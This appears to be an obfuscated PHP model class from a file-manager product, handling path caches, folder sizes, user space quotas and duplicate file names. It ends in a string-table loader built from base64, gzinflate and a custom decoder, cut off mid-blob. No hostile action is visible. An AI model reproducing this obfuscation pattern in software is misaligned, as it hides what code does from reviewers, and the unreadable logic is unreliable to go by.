(!$cÓÌ½÷ï) { return !1; } $cÓÌ½÷ï = $this->_listDataApplyItem($cÓÌ½÷ï, $e¬Ü¨Îœ›Ì); goto c‚ö‡“Ôî; F‰ÏªÂŠÁè: $B¹Ö…ÇèÖ = $fÏ‰îÙ¾º[448] . intval($e¬Ü¨Îœ›Ì) . $fÏ‰îÙ¾º[449] . $dé•¦íìĞî; $f»ˆÔ’çßÓ = _get(self::$cachePathInfo, $B¹Ö…ÇèÖ); if ($f»ˆÔ’çßÓ) { return $f»ˆÔ’çßÓ; } goto fØÖÙàïã“; c‚ö‡“Ôî: self::$cachePathInfo[$B¹Ö…ÇèÖ] = $cÓÌ½÷ï; return $cÓÌ½÷ï; goto dÑíªÇ Ÿ®; díèãÃÔ‘–: $fÏ‰îÙ¾º =& $_SERVER[Ü˜]; $e¬Ü¨Îœ›Ì = !1; $dé•¦íìĞî = intval($dé•¦íìĞî); goto F‰ÏªÂŠÁè; dÑíªÇ Ÿ®: } public static $cachePathInfoMore = array(); public function pathInfoMore($DÏêäØ£½Ó) { goto Aç™Š¬ÌÍó; Aç™Š¬ÌÍó: $F¼›÷¹Ûë£ =& $_SERVER[Ü˜]; $d“‚Ÿ­ã = _get(self::$cachePathInfoMore, $DÏêäØ£½Ó); if ($d“‚Ÿ­ã) { return $d“‚Ÿ­ã; } goto A‚ˆ±‡Ä¶‘; A‚ˆ±‡Ä¶‘: $C°¼ƒÑéÍÄ = $this->pathInfo($DÏêäØ£½Ó); if (!$C°¼ƒÑéÍÄ) { return !1; } if ($C°¼ƒÑéÍÄ[$F¼›÷¹Ûë£[412]] == $F¼›÷¹Ûë£[97]) { $C°¼ƒÑéÍÄ[$F¼›÷¹Ûë£[91]] = $this->folderChildrenNumber($DÏêäØ£½Ó); } goto C˜ˆöÑ¶Ü¶; C˜ˆöÑ¶Ü¶: self::$cachePathInfoMore[$DÏêäØ£½Ó] = $C°¼ƒÑéÍÄ; return $C°¼ƒÑéÍÄ; goto a‹ÙåÍâí‹; a‹ÙåÍâí‹: } public function sourceInfo($F¿Úºİ) { goto Eäáˆ¾ˆÜÓ; d™«¡£‚¤¾: $bÒ­ô–ÜÖ = $this->where(array($C¬ ›Ú¶½[404] => $F¿Úºİ))->find(); self::$cacheSourceInfo[$fŠ‹Ä¾¢ò‡] = $bÒ­ô–ÜÖ; return self::$cacheSourceInfo[$fŠ‹Ä¾¢ò‡]; goto C¹Ä••Şéò; EÂˆ›„íÛ’: $fŠ‹Ä¾¢ò‡ = $C¬ ›Ú¶½[447] . $F¿Úºİ; $FÏ¥¯–íˆ = _get(self::$cacheSourceInfo, $fŠ‹Ä¾¢ò‡); if ($FÏ¥¯–íˆ) { return $FÏ¥¯–íˆ; } goto d™«¡£‚¤¾; Eäáˆ¾ˆÜÓ: $C¬ ›Ú¶½ =& $_SERVER[Ü˜]; if (!$F¿Úºİ) { return array(); } $F¿Úºİ = intval($F¿Úºİ); goto EÂˆ›„íÛ’; C¹Ä••Şéò: } public function sourceCacheClear($b”àâ†Ç¿ù = false) { self::cacheClear($b”àâ†Ç¿ù); } public static function cacheClear($EÉö£›·ï = false) { $d Û¿”Ò…Ÿ =& $_SERVER[Ü˜]; if ($EÉö£›·ï == !1) { goto c¥åè…Ö÷É; c¥åè…Ö÷É: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto c„õ–†—”å; BÓ’…Ì‹Úµ: return; goto DñóôªîÏá; c„õ–†—”å: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto BÓ’…Ì‹Úµ; DñóôªîÏá: } unset(self::$cacheSourceInfo[$d Û¿”Ò…Ÿ[447] . $EÉö£›·ï]); unset(self::$cachePathInfoMore[$EÉö£›·ï]); unset(self::$cachePathInfo[$d Û¿”Ò…Ÿ[1978] . $EÉö£›·ï]); unset(self::$cachePathInfo[$d Û¿”Ò…Ÿ[1979] . $EÉö£›·ï]); } public function metaSet($EÊ¯…‚âª, $e¨ö‘á©˜à = null, $eÄ›ºøô•Ç = null) { $cÎˆÂß˜Àœ = parent::metaSet($EÊ¯…‚âª, $e¨ö‘á©˜à, $eÄ›ºøô•Ç); if ($cÎˆÂß˜Àœ) { $this->sourceCacheClear($EÊ¯…‚âª); } return $cÎˆÂß˜Àœ; } public function pathInfoByPath($F–À‰Ø¿‘×, $f’İ¯Øí«–) { $d¡ŸØ…èÚ° =& $_SERVER[Ü˜]; $f«ƒÚÃªù³ = !$f’İ¯Øí«– ? array() : explode($d¡ŸØ…èÚ°[8], trim($f’İ¯Øí«–, $d¡ŸØ…èÚ°[8])); $E©¿ŠàÏŸ² = $F–À‰Ø¿‘×; foreach ($f«ƒÚÃªù³ as $bİö¥İÓí) { $E¡¦åÇš£š = array($d¡ŸØ…èÚ°[487] => $E©¿ŠàÏŸ², $d¡ŸØ…èÚ°[28] => $bİö¥İÓí); $B¦­Ã‹å´ = $this->where($E¡¦åÇš£š)->select(); if (!$B¦­Ã‹å´) { return !1; } $B¦­Ã‹å´ = array_sort_by($B¦­Ã‹å´, $d¡ŸØ…èÚ°[432]); $E©¿ŠàÏŸ² = $B¦­Ã‹å´[0][$d¡ŸØ…èÚ°[404]]; } return $this->pathInfo($E©¿ŠàÏŸ², !0); } protected function updateModifyTime($a±Å­ µÒ°) { goto b½»ÌÎ’ÓÏ; F¤¯•äÓæö: $this->where($aìãåŠ»ï)->save($EòíáÍ±…³); goto DŒÓÙÔ‘ö°; FÅ®Éí˜ñ©: foreach ($a±Å­ µÒ° as $aŒÓ—ÒˆÕÇ => $CÜÌØÂÌâ•) { $a±Å­ µÒ°[$aŒÓ—ÒˆÕÇ] = intval($CÜÌØÂÌâ•); $this->sourceCacheClear($CÜÌØÂÌâ•); } $aìãåŠ»ï = array($CÛ‘¨Ç¦¿‡[404] => array($CÛ‘¨Ç¦¿‡[7], $a±Å­ µÒ°)); $EòíáÍ±…³ = array($CÛ‘¨Ç¦¿‡[561] => USER_ID, $CÛ‘¨Ç¦¿‡[426] => time()); goto F¤¯•äÓæö; b½»ÌÎ’ÓÏ: $CÛ‘¨Ç¦¿‡ =& $_SERVER[Ü˜]; if (!$a±Å­ µÒ°) { return; } if (!is_array($a±Å­ µÒ°)) { $a±Å­ µÒ° = array($a±Å­ µÒ°); } goto FÅ®Éí˜ñ©; DŒÓÙÔ‘ö°: } public function folderSizeReset($BõÖ¨ÖÂ¤Û, $fá†÷Ş“ƒ = false) { goto e‘ÙÏ‚ˆ¹; EÇËÜœ¨„®: if ($fá†÷Ş“ƒ == 0) { return CacheLock::unlock($FğÌÕÌŸğ); } $bÑÖ›Äˆğ¨ = $this->parentLevelArray($Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[496]]); if (!$bÑÖ›Äˆğ¨) { $bÑÖ›Äˆğ¨ = array(); } goto BÙÇ¤¼ºÌª; BŠí¼œõ: $b·‰´ÊÃª‚ = array($Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[413]], $Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[493]]); TaskRun::timeLimitCall($dÎã÷À’Ü¼, $E÷ô‰ä´ŞÃ[1982], $b·‰´ÊÃª‚, 1.5); goto añ”ª“ËÔœ; d¢¤¨ëÄ¼º: $this->where($Bã˜‰Ûíè®)->setAdd($E÷ô‰ä´ŞÃ[88], $fá†÷Ş“ƒ); CacheLock::unlock($FğÌÕÌŸğ); $dÎã÷À’Ü¼ = $E÷ô‰ä´ŞÃ[1981] . $Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[413]] . $E÷ô‰ä´ŞÃ[4] . $Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[493]]; goto BŠí¼œõ; e‘ÙÏ‚ˆ¹: $E÷ô‰ä´ŞÃ =& $_SERVER[Ü˜]; if ($this->statusIgnoreResetSpace) { return; } $Aî¨ŠÚê¯ƒ = $this->sourceInfo($BõÖ¨ÖÂ¤Û); goto bÚáá¥šäÇ; BÙÇ¤¼ºÌª: $bÑÖ›Äˆğ¨[] = $Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[404]]; $Bã˜‰Ûíè® = array($E÷ô‰ä´ŞÃ[404] => array($E÷ô‰ä´ŞÃ[420], $bÑÖ›Äˆğ¨)); if ($fá†÷Ş“ƒ < 0) { $Bã˜‰Ûíè®[$E÷ô‰ä´ŞÃ[88]] = array($E÷ô‰ä´ŞÃ[973], abs($fá†÷Ş“ƒ)); } goto d¢¤¨ëÄ¼º; bÚáá¥šäÇ: $FğÌÕÌŸğ = $E÷ô‰ä´ŞÃ[1980] . $BõÖ¨ÖÂ¤Û; CacheLock::lock($FğÌÕÌŸğ, 20); if ($fá†÷Ş“ƒ === !1) { $this->sourceCacheClear($BõÖ¨ÖÂ¤Û); $Aî¨ŠÚê¯ƒ = $this->sourceInfo($BõÖ¨ÖÂ¤Û); $Bã˜‰Ûíè® = array($E÷ô‰ä´ŞÃ[403] => $BõÖ¨ÖÂ¤Û, $E÷ô‰ä´ŞÃ[431] => 0); $e¾³Ğ‡‡™‡ = $this->where($Bã˜‰Ûíè®)->sum($E÷ô‰ä´ŞÃ[88]); $fá†÷Ş“ƒ = intval($e¾³Ğ‡‡™‡) - intval($Aî¨ŠÚê¯ƒ[$E÷ô‰ä´ŞÃ[88]]); } goto EÇËÜœ¨„®; añ”ª“ËÔœ: } public function folderSizeResetChildren($AµØ…‘Û‚½) { goto a˜íŒªøä; BâÊùîùÇ: $f¦‡¾Ì”‹…[] = $f—Œë¶¢¸ç; $f¦‡¾Ì”‹… = array_to_keyvalue($f¦‡¾Ì”‹…, $fóºˆíåÜê[404]); foreach ($f¦‡¾Ì”‹… as $Cè¼›Ä˜¼Ğ => $eéÕù»‘Â) { $f¦‡¾Ì”‹…[$Cè¼›Ä˜¼Ğ][$fóºˆíåÜê[1984]] = $f¦‡¾Ì”‹…[$Cè¼›Ä˜¼Ğ][$fóºˆíåÜê[88]]; $f¦‡¾Ì”‹…[$Cè¼›Ä˜¼Ğ][$fóºˆíåÜê[88]] = 0; } goto B¦öØñ¼ø¿; a˜íŒªøä: $fóºˆíåÜê =& $_SERVER[Ü˜]; $this->sourceCacheClear($AµØ…‘Û‚½); $f—Œë¶¢¸ç = $this->sourceInfo($AµØ…‘Û‚½); goto C˜í›ÈéõÀ; FâƒÛšĞÀÀ: foreach ($f¦‡¾Ì”‹… as $eéÕù»‘Â) { if ($eéÕù»‘Â[$fóºˆíåÜê[88]] == $eéÕù»‘Â[$fóºˆíåÜê[1984]]) { continue; } $bé‰öõÍç×[] = array($fóºˆíåÜê[404], $eéÕù»‘Â[$fóºˆíåÜê[404]], $fóºˆíåÜê[88], $eéÕù»‘Â[$fóºˆíåÜê[88]]); } $this->saveAll($bé‰öõÍç×); goto e’„‚É§º‘; B¦öØñ¼ø¿: foreach ($aÛ¯×Êæß• as $eéÕù»‘Â) { $FÙ™Ë÷ˆïö = $eéÕù»‘Â[$fóºˆíåÜê[487]] . $fóºˆíåÜê[33]; if (!isset($f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö])) { continue; } if ($eéÕù»‘Â[$fóºˆíåÜê[432]] == $f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö][$fóºˆíåÜê[432]]) { $f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö][$fóºˆíåÜê[88]] += $eéÕù»‘Â[$fóºˆíåÜê[88]]; } } foreach ($f¦‡¾Ì”‹… as $eéÕù»‘Â) { $C°‘ÆİÅäì = $this->parentLevelArray($eéÕù»‘Â[$fóºˆíåÜê[496]]); foreach ($C°‘ÆİÅäì as $FÙ™Ë÷ˆïö) { $FÙ™Ë÷ˆïö = $FÙ™Ë÷ˆïö . $fóºˆíåÜê[33]; if (!isset($f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö])) { continue; } if ($eéÕù»‘Â[$fóºˆíåÜê[432]] == $f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö][$fóºˆíåÜê[432]]) { $f¦‡¾Ì”‹…[$FÙ™Ë÷ˆïö][$fóºˆíåÜê[88]] += $eéÕù»‘Â[$fóºˆíåÜê[88]]; } } } $bé‰öõÍç× = array(); goto FâƒÛšĞÀÀ; eê¶ øêÑœ: $Fˆ²œÛë©­[$fóºˆíåÜê[412]] = 0; $aÛ¯×Êæß• = $this->field($D¡’…Ùë™è)->where($Fˆ²œÛë©­)->select(); if (!$aÛ¯×Êæß•) { return; } goto BâÊùîùÇ; C˜í›ÈéõÀ: $Fˆ²œÛë©­ = array($fóºˆíåÜê[555] => 1, $fóºˆíåÜê[562] => array($fóºˆíåÜê[521], $f—Œë¶¢¸ç[$fóºˆíåÜê[496]] . $AµØ…‘Û‚½ . $fóºˆíåÜê[522])); $D¡’…Ùë™è = $fóºˆíåÜê[1983]; $f¦‡¾Ì”‹… = $this->field($D¡’…Ùë™è)->where($Fˆ²œÛë©­)->select(); goto eê¶ øêÑœ; e’„‚É§º‘: } public function userSpaceReset($fË§ÛïµÜª = false) { $A„¸¸Ó„Š³ =& $_SERVER[Ü˜]; $C©Ø‚Ö¹ë = $this->where(array($A„¸¸Ó„Š³[413] => self::TYPE_USER, $A„¸¸Ó„Š³[493] => $fË§ÛïµÜª, $A„¸¸Ó„Š³[412] => 0))->sum($A„¸¸Ó„Š³[88]); $C©Ø‚Ö¹ë = !$C©Ø‚Ö¹ë || $C©Ø‚Ö¹ë <= 0 ? 0 : $C©Ø‚Ö¹ë; Model($A„¸¸Ó„Š³[511])->userEdit($fË§ÛïµÜª, array($A„¸¸Ó„Š³[1679] => $C©Ø‚Ö¹ë)); } public function targetSpaceUpdate($a±ä´ÄÛÁ, $fèİ¼›êÇà) { $fõÂ÷Ã‚ =& $_SERVER[Ü˜]; if (!$fèİ¼›êÇà) { return; } if (!in_array($a±ä´ÄÛÁ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d„åÒİ«õ‘ = $this->targetSpaceSize($a±ä´ÄÛÁ, $fèİ¼›êÇà); if ($a±ä´ÄÛÁ == self::TYPE_USER) { Model($fõÂ÷Ã‚[511])->userEdit($fèİ¼›êÇà, array($fõÂ÷Ã‚[1679] => $d„åÒİ«õ‘)); } else { if ($a±ä´ÄÛÁ == self::TYPE_GROUP) { Model($fõÂ÷Ã‚[495])->groupEdit($fèİ¼›êÇà, array($fõÂ÷Ã‚[1679] => $d„åÒİ«õ‘)); } } } public function targetSpaceSize($F¯ø”­«ß, $aÄµ½¿íë) { goto B©ßÖòíÏ›; B©ßÖòíÏ›: $DÍ÷ ¬ºà =& $_SERVER[Ü˜]; $côÔ†šÁÛ = $this->sourceRoot($F¯ø”­«ß, $aÄµ½¿íë, !0); if (!$côÔ†šÁÛ) { return 0; } goto AŒöâß§ÇÙ; C˜ÇØ±ÂŸ: $EÙÓ‡¤ö˜˜ = !$EÙÓ‡¤ö˜˜ || $EÙÓ‡¤ö˜˜ <= 0 ? 0 : $EÙÓ‡¤ö˜˜; return $EÙÓ‡¤ö˜˜; goto AºÓë´É©ì; DĞÁíö¬Œá: $få±¢‹½ƒé = array_to_keyvalue($få±¢‹½ƒé, $DÍ÷ ¬ºà[33], $DÍ÷ ¬ºà[404]); $få±¢‹½ƒé = array_unique(array_filter($få±¢‹½ƒé)); if ($få±¢‹½ƒé) { $c‹ˆ‰Ì  = array($DÍ÷ ¬ºà[419] => array($DÍ÷ ¬ºà[420], $få±¢‹½ƒé)); $EÙÓ‡¤ö˜˜ += floatval($this->where($c‹ˆ‰Ì )->sum($DÍ÷ ¬ºà[88])); } goto C˜ÇØ±ÂŸ; AŒöâß§ÇÙ: $EÙÓ‡¤ö˜˜ = floatval($côÔ†šÁÛ[$DÍ÷ ¬ºà[88]]); $c‹ˆ‰Ì  = array($DÍ÷ ¬ºà[562] => array($DÍ÷ ¬ºà[521], $DÍ÷ ¬ºà[507] . $côÔ†šÁÛ[$DÍ÷ ¬ºà[404]] . $DÍ÷ ¬ºà[522])); $få±¢‹½ƒé = Model($DÍ÷ ¬ºà[430])->field($DÍ÷ ¬ºà[419])->where($c‹ˆ‰Ì )->select(); goto DĞÁíö¬Œá; AºÓë´É©ì: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c‰õ«»…Í) { return $this->fileTypeProfile($c‰õ«»…Í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C‘îÙˆè¡½) { return $this->fileTypeProfile($C‘îÙˆè¡½, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Eğ…»ö¾§Ö, $b·‹‰Æ¸×¶) { goto b·¢¹Á”Ì™; BÇ½À‘Êäê: if ($fóÛÏäõÔ) { return $fóÛÏäõÔ; } $D•Òš¯ë¤ = array($f®íòØËçˆ[555] => 0); if ($Eğ…»ö¾§Ö != !1) { $D•Òš¯ë¤[$f®íòØËçˆ[493]] = $Eğ…»ö¾§Ö; $D•Òš¯ë¤[$f®íòØËçˆ[413]] = $b·‹‰Æ¸×¶; } goto B¹î’­Ö½Œ; cêßĞ¡¯Ÿ…: foreach ($fî¸Í•Í¢¿ as $e‘¬­ØÏ‡ë => $a¶Ô˜á±º) { $D•Òš¯ë¤[$f®íòØËçˆ[414]] = $this->fileTypeWhere($e‘¬­ØÏ‡ë); $A»ˆÈøÌ„‚[$e‘¬­ØÏ‡ë] = array($f®íòØËçˆ[1987] => $a¶Ô˜á±º[$f®íòØËçˆ[28]], $f®íòØËçˆ[1988] => $this->where($D•Òš¯ë¤)->count(), $f®íòØËçˆ[557] => $this->where($D•Òš¯ë¤)->sum($f®íòØËçˆ[88])); } Cache::set($b¯ÓæàİñÎ, $A»ˆÈøÌ„‚, 1200); return $A»ˆÈøÌ„‚; goto Dìá¤ä¯ë; B¹î’­Ö½Œ: $A»ˆÈøÌ„‚ = array(); $A»ˆÈøÌ„‚[$f®íòØËçˆ[1986]] = array($f®íòØËçˆ[1987] => LNG($f®íòØËçˆ[1986]), $f®íòØËçˆ[1988] => $this->where($D•Òš¯ë¤)->count(), $f®íòØËçˆ[557] => $this->where($D•Òš¯ë¤)->sum($f®íòØËçˆ[88])); $fî¸Í•Í¢¿ = KodIO::fileTypeList(); goto cêßĞ¡¯Ÿ…; b·¢¹Á”Ì™: $f®íòØËçˆ =& $_SERVER[Ü˜]; $b¯ÓæàİñÎ = $f®íòØËçˆ[1985] . $Eğ…»ö¾§Ö . $f®íòØËçˆ[81] . $b·‹‰Æ¸×¶; $fóÛÏäõÔ = Cache::get($b¯ÓæàİñÎ); goto BÇ½À‘Êäê; Dìá¤ä¯ë: } public function fileNameExist($A¤ÏÔ©†µ„, $DÛÒ…õğ÷ô) { $FÈ«Å© º =& $_SERVER[Ü˜]; $B¥“óµ‹æ = $this->where(array($FÈ«Å© º[487] => $A¤ÏÔ©†µ„, $FÈ«Å© º[28] => $DÛÒ…õğ÷ô, $FÈ«Å© º[432] => 0))->find(); return is_array($B¥“óµ‹æ) ? $B¥“óµ‹æ[$FÈ«Å© º[404]] : !1; } public function childList($Aà¼õô¶­) { goto bøÍÃ·õ„Ç; dÕ¹‘¿àæÖ: $bç·ùÔ¦ïš = array($a™­ÈáÈ¬é[487] => intval($Aà¼õô¶­), $a™­ÈáÈ¬é[432] => 0); $e£è×¯İÌò = $this->where($bç·ùÔ¦ïš)->select(); $e£è×¯İÌò = $e£è×¯İÌò ? $e£è×¯İÌò : array(); goto AòÏˆ²â–Ë; AòÏˆ²â–Ë: self::$cacheChildList[$eÙ—¤ÈÅ¤] = $e£è×¯İÌò; foreach ($e£è×¯İÌò as $BËó¥†ªã¤) { $eÙ—¤ÈÅ¤ = $a™­ÈáÈ¬é[447] . $BËó¥†ªã¤[$a™­ÈáÈ¬é[404]]; self::$cacheSourceInfo[$eÙ—¤ÈÅ¤] = $BËó¥†ªã¤; } return $e£è×¯İÌò; goto d‚²øğÑ²ó; bøÍÃ·õ„Ç: $a™­ÈáÈ¬é =& $_SERVER[Ü˜]; $eÙ—¤ÈÅ¤ = $a™­ÈáÈ¬é[1963] . $Aà¼õô¶­; if (isset(self::$cacheChildList[$eÙ—¤ÈÅ¤])) { return self::$cacheChildList[$eÙ—¤ÈÅ¤]; } goto dÕ¹‘¿àæÖ; d‚²øğÑ²ó: } public function fileNameAuto($Fº÷íŠèğ†, $b¶ñ­©¡ñ, $D¶·ºéª¦ = REPEAT_RENAME, $EÃ£íÖ¡¼ = false) { $Fõ¡ä¬à² =& $_SERVER[Ü˜]; $FÔŞ¬ƒÔâè = array($Fõ¡ä¬à²[487] => $Fº÷íŠèğ†, $Fõ¡ä¬à²[432] => 0, $Fõ¡ä¬à²[28] => array($Fõ¡ä¬à²[389], $b¶ñ­©¡ñ . $Fõ¡ä¬à²[390])); $fë§³ÔŠÌ = $this->field($Fõ¡ä¬à²[28])->where($FÔŞ¬ƒÔâè)->select(); $e¥äÆ³ÅÖ = array_to_keyvalue($fë§³ÔŠÌ, $Fõ¡ä¬à²[33], $Fõ¡ä¬à²[28]); return $this->fileNameAutoGet($e¥äÆ³ÅÖ, $b¶ñ­©¡ñ, $D¶·ºéª¦, $EÃ£íÖ¡¼); } public function fileNameAutoGet($BÀÇçÄï¡ó, $c‹¥ÊÁ™õ‡, $eË×ÂƒÁ‚ö, $B˜µö¼Ÿ¿) { $F‡é ±‡Í– =& $_SERVER[Ü˜]; if ($eË×ÂƒÁ‚ö == REPEAT_REPLACE || !$BÀÇçÄï¡ó || !in_array_not_case($c‹¥ÊÁ™õ‡, $BÀÇçÄï¡ó) || $B˜µö¼Ÿ¿ && $eË×ÂƒÁ‚ö != REPEAT_RENAME_FOLDER) { return $c‹¥ÊÁ™õ‡; } if ($eË×ÂƒÁ‚ö == REPEAT_SKIP) { return !1; } $A‡®ùËƒŸ = $F‡é ±‡Í–[105] . get_path_ext($c‹¥ÊÁ™õ‡); $A‡®ùËƒŸ = $A‡®ùËƒŸ == $F‡é ±‡Í–[105] || $B˜µö¼Ÿ¿ ? $F‡é ±‡Í–[33] : $A‡®ùËƒŸ; for ($AÀ‡ô¬ÎÓø = 1; $AÀ‡ô¬ÎÓø <= count($BÀÇçÄï¡ó) + 1; $AÀ‡ô¬ÎÓø++) { $eÜïŠµ³¥ = substr($c‹¥ÊÁ™õ‡, 0, strlen($c‹¥ÊÁ™õ‡) - strlen($A‡®ùËƒŸ)); $FÖó–šÓÙ = $eÜïŠµ³¥ . "\50{$AÀ‡ô¬ÎÓø}\x29{$A‡®ùËƒŸ}"; if (!in_array_not_case($FÖó–šÓÙ, $BÀÇçÄï¡ó)) { return $FÖó–šÓÙ; } } } } goto eœîÖ·§Å; d÷ØÉĞÊÁˆ: if (!function_exists('_kodDe')) { function _kodDe($C¼ˆ‚ƒ§®ó) { $C¼ˆ‚ƒ§®ó = base64_decode($C¼ˆ‚ƒ§®ó); $E®ØÏ¸ˆ¼¼ = strlen($C¼ˆ‚ƒ§®ó); $cÛÈİµœ×¿ = ''; $d„ğ°Ì°Ä× = ord($C¼ˆ‚ƒ§®ó[0]) - 30; for ($F”ç«Ò¥ˆœ = 1; $F”ç«Ò¥ˆœ < $E®ØÏ¸ˆ¼¼; $F”ç«Ò¥ˆœ += 2) { if ($F”ç«Ò¥ˆœ + 1 < $E®ØÏ¸ˆ¼¼) { $cÛÈİµœ×¿ .= chr(ord($C¼ˆ‚ƒ§®ó[$F”ç«Ò¥ˆœ + 1]) + $d„ğ°Ì°Ä×); $cÛÈİµœ×¿ .= chr(ord($C¼ˆ‚ƒ§®ó[$F”ç«Ò¥ˆœ]) + $d„ğ°Ì°Ä×); } else { $cÛÈİµœ×¿ .= chr(ord($C¼ˆ‚ƒ§®ó[$F”ç«Ò¥ˆœ]) + $d„ğ°Ì°Ä×); } } return $cÛÈİµœ×¿; } } define(base64_decode('3JCY'), base64_decode('1M7q4aOI')); $_SERVER[Ü˜] = explode("\x7c\x1\x7c\x2\x7c\x6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\7\174\133\325\365\60\64\24\110\332\102\131\45\100\200\27\223\340\21\15\147\47\116\34\107\266\144\133\104\266\214\44\147\20".strrev('Şû»ã(có³g²”-6{°†{)$!ÈP£*Êò{ß“Ò[=$ô“Ê\'').base64_decode('9yTT///3fYFE756717nnnHvOud/sWXLwkl8sOfTNby7YcO3Zr+EA+PuLJYfg7w==')."\x53\x57\x1c\x7e\x10\xfa\x33\x64\xc5\x45\x15\x15\xcd\x93\x86\x8d\x69\xfd\xf5\x9a\x7b\x6e\x97\x7f\x51\xbf\xee\x9b\xc7\xef\x79\x7e\xd3\x4b\xef\x3e\xbf\x39\x92\x98\xf1\xc0\xa6\xd4\x29\x7"."\x9d\xfb\xd3\xa5\x55\x35\x20\x29\xce\x59\x83\x7f\xa4\x9c\x66\x4a\x4a\x9f\x6a\x98\x6\x6\xc4\xb5\x5c\x52\x4d\xe1\x6f\x35\x87\x7f\xdd\xf8\xc7\xe8\xce\xa8\xa6\x82\xbf\xa3\xad\xc1\x48\x34"."\334\336\326\346\13\105\242\244\104\61\76\253\45\310\127\136\326\345\54\51\74\257\350\6\250\112\54\56\232\327\362\112\316\2\341\200\204\154\312\61\331\40\45\171\353\243"."\136\137\133\40\70\57\32\231\327\346\43\51\142\321\356\202\242\367\343\20\372\14\233\262\156\106\324\254\302\122\364\352\254\135\365\276\46\177\253\24\11\171\132\303\236\206"._kodDe('KDV+gM4Dt4y3dQwOmgAU+PyU6098J7sXY0lFPYHj+B7BK0fKjZogLjuHXH9KEDU=')."\125\45\223\300\237\71\231\66\307\354\317\223\257\10\373\2\163\220\53\144\62\70\320\312\276\110\373\225\244\134\310\220\61\363\212\201\274\256\146\145\332\365\131\112\77\203".base64_decode('4g+5YGpqLo4Dvj5TlzkctDiuK1klR4oK+wK+hogEmyk1hoItEpmKrGyYii7NaQ==')."\xf6\x85\x7c\x12\x6c\x7a\x6d\x39\xea\x71\xb9\x84\xf3\xb5\xb7\x82\x1\x91\x3c\x81\x80\x34\x58\x9\xa6\x92\xcd\xd3\x62\x70\x9e\x12\x85\x5\x43\x5e\x5f\x48\xaa\x9f\x27\xf1\x71\x8a\x6b\xd9".base64_decode('rJZzgVLAfJpCU32hEP5wkBUc8MOpI4FgY2PYx0Kkc2cGQEvGk1VqCSWSGTPaIw==')."\x67\xa\x74\xb1\x76\xe1\xdf\x72\xf2\x43\x7e\xa3\x72\x52\xcd\x90\x24\xf0\xcb\x50\x7\x14\x31\x26\xc\xc2\xfe\x1c\x8f\x8f\xa6\x14\x33\xa\x76\x92\x9\x5a\x4d\x96\x7e\xbd\x27\xec\x6f\x88".strrev('›¦˜åEw‰ZIŒ3ü0ŞwF+¼—'."\r".'Îjc¹@J=«O²Ü2è‘·yòdÍ"y¶').strrev('ÚÏàô^€kò#äQ'."\n".'© Qòoí5GH¥²©Í[«©kF‘ÍF\\…XY'."\n".'')."\31\370\167\32\111\24\203\75\354\121\164\63\252\344\342\132\102\315\21\254\121\107\106\206\354\23\331\114\173\165\320\101\235\24\250\271\342\132\276\277\105\353\21\306\63\300".base64_decode('kEJSyyQUnYfzILsYQ3rFxh/mbi1kxSQsCMY1k9CV3H9PCbCVmuznOMPQCnoczA==')."\x68\x52\xe3\x79\xdb\x58\x4b\xc6\x92\x44\x8a\x69\x82\x4e\x1b\xb4\x5f\xed\xf9\x8c\x26\x27\xc2\x8a\x2e\xf4\xb5\x11\x64\xc\x16\x4c\x11\x58\x40\xc9\x1a\x35\x3d\xeb\x5\x53\x4d\xea\x7\x7b"."\132\155\57\21\321\105\167\165\102\30\102\27\301\312\25\363\317\166\376\270\140\376\114\360\117\45\101\321\35\244\151\151\45\223\211\52\175\12\331\375\331\304\104\203\366\325"."\155\300\145\6\40\70\350\17\106\323\262\221\156\111\114\214\242\134\24\363\47\224\76\127\76\235\47\10\212\341\244\16\313\356\204\263\323\252\231\76\341\374\310\150\161\71"."\43\366\24\177\247\115\63\37\126\162\211\106\266\217\22\132\157\16\15\130\136\241\213\331\353\220\22\122\213\64\117\152\256\121\153\14\232\61\233\141\137\264\167\14\146\60"."\xa0\xd9\x47\x56\x4c\x19\x9\x2b\x7d\x26\x19\x14\x69\x5a\x3c\x2d\xeb\x60\xba\x6a\xb\x66\xd2\x39\x85\xed\xbf\x8c\x1a\x97\x4d\x55\xcb\xb9\xb5\xb8\xa9\x98\x4e\xc3\xd4\x15\x99\x94\xe6\x89"."\xc7\x15\xc3\x70\x36\x80\x2d\xac\x6b\x19\xa7\x27\x93\xd1\x7a\x9d\x41\x5d\x4d\xa9\xb9\x1a\xa9\x8a\x9c\x19\x78\x7f\x3b\x21\x1e\xaf\x21\xa8\xa6\x6c\x9a\x4\xd7\xa\x44\x63\x55\xb8\x36\x8a"."\x42\x58\x6a\x5d\xce\x19\x49\x45\x77\xfa\xc8\xa6\xa9\x91\xc0\x7c\x30\x34\x4e\x93\x79\x55\x23\xaf\x19\x2a\x6c\x5e\x8d\x24\x9b\xa6\x1c\x4f\x43\x14\xc8\x8b\xaf\xfd\x99\xf4\x2a\x44\xa\x4a".strrev('‚ÙHtqHÔĞÉ©Ã-îÈd`bÊF¹YS—M³Šé@B‰jjU¶ƒÕ^__ZQ')."\141\72\165\5\340\122\25\240\60\62\307\376\244\263\5\156\55\125\111\70\303\340\310\41\340\361\325\23\44\260\154\44\32\207\241\315\221\110\133\324\337\10\50\213\126\137"."\264\305\23\151\40\230\322\147\312\51\332\346\0\70\110\130\221\24\70\327\11\266\30\134\130\255\240\257\34\330\246\365\52\72\250\270\276\277\106\352\322\22\61\255\317\105"."\xa3\x1a\x9\xce\xa6\x89\xe1\x74\xe7\x4d\x67\x48\xce\xa5\xe0\xf8\xc4\xf